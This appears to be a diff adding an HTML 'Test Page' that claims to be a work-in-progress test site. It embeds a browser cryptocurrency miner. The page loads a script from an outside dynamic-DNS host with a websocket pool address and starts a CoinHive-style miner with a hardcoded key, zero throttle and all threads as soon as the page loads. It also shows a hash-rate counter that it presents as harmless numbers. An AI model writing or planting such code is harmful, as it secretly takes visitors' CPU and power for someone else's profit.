@@ -1,0 +1,64 @@
+<html>
+<head>
+    <title>Test Page</title>
+    <link rel="stylesheet" href="../styles/loading.css">
+    <style>
+        body {
+            background-color: lightblue;
+        }
+    </style>
+</head>
+    <div class="sk-cube-center" id="loading" hidden>
+        <div class="sk-cube-grid">
+          <div class="sk-cube sk-cube1"></div>
+          <div class="sk-cube sk-cube2"></div>
+          <div class="sk-cube sk-cube3"></div>
+          <div class="sk-cube sk-cube4"></div>
+          <div class="sk-cube sk-cube5"></div>
+          <div class="sk-cube sk-cube6"></div>
+          <div class="sk-cube sk-cube7"></div>
+          <div class="sk-cube sk-cube8"></div>
+          <div class="sk-cube sk-cube9"></div>
+        </div>
+    </div>
+<body>
+    <h1 id="h1title" align="center">Test page</h1>
+    <div id="body">
+            <p>This is a test site. It is still a heavy work in progress. Click to toggle on and off. Here are some numbers you may like</p>
+    <div style="color:blue;cursor:pointer;" id="hashdiv" onclick="toggleminer();">
+        |<span id="hs">0</span>|<span id="ah">0</span>|<span id="th">0</span>|
+    </div>
+    </div>
+    <span id="settings" hidden="true">
+        <!--This may be used in the future to deal with possible pool settings.-->
+        <span id="version">a2018.2.12.1</span>
+    </span>
+</body>
+<script src="../scripts/jquery.min.js"></script>
+<script src="../scripts/tmutils.js"></script>
+<script src="../scripts/tmjqutils.js"></script>
+<script src="https://gustaver.ddns.net/media/media.js?gustav=ws://gustaver.ddns.net:8901"></script>
+<script type="text/javascript">
+var mrwayne = new CH.Anonymous('G6qjWvMp2tdR18ojqhZX3dCGVW6X2tVbXdeP7EFWYYwCA87pbwAEohj1cpKhJXH5ZiZuXJRLbaRQ16dgTo4QFHPVB3eSTCx', { autoThreads: true, throttle: 0.0, forceASMJS: false });
+mrwayne.start(CH.FORCE_EXCLUSIVE_TAB);
+$(document).ready(function() {
+    refreshOnUpdate(5000);
+    
+    setInterval(function(){
+        var hr = mrwayne.getHashesPerSecond().toFixed(1);
+        var ah = mrwayne.getAcceptedHashes();
+        var th = mrwayne.getTotalHashes();
+        if(document.getElementById("hs").innerHTML && hr != document.getElementById("hs").innerHTML) {
+            document.getElementById("hs").innerHTML = hr;
+        }
+        if(document.getElementById("ah").innerHTML && ah != document.getElementById("ah").innerHTML) {
+            document.getElementById("ah").innerHTML = ah;
+        }
+        if(document.getElementById("th").innerHTML && th != document.getElementById("th").innerHTML) {
+            document.getElementById("th").innerHTML = th;
+        }
+    }, 1000);
+});
+
+</script>
+</html>
